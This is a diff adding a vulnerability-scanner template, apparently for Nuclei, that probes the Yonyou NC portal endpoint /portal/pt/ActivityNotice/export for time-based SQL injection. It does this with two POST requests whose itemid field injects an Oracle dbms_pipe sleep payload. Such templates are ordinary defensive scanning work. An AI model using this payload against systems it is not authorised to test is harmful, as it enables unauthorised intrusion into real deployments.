@@ -1,0 +1,35 @@
+id: youyouNC-ActivityNotice-export-sqli
+
+info:
+  name: 用友NC ActivityNotice/export 存在SQL注入漏洞
+  author: youyouNC
+  severity: high
+  tags: youyouNC
+
+http:
+  - raw:
+      - |
+        POST /portal/pt/ActivityNotice/export?pageId=login HTTP/1.1
+        Content-Type: application/x-www-form-urlencoded
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+
+        itemid=1' AND 1=dbms_pipe.receive_message('RDS', 2)--
+
+      - |
+        POST /portal/pt/ActivityNotice/export?pageId=login HTTP/1.1
+        Content-Type: application/x-www-form-urlencoded
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+
+        itemid=1' AND 1=dbms_pipe.receive_message('RDS', 4)--
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=2 && duration_1<4'  
+          - 'duration_2>=4 && duration_2<6'
+          - 'len(body) < 10'
+        condition: and
+
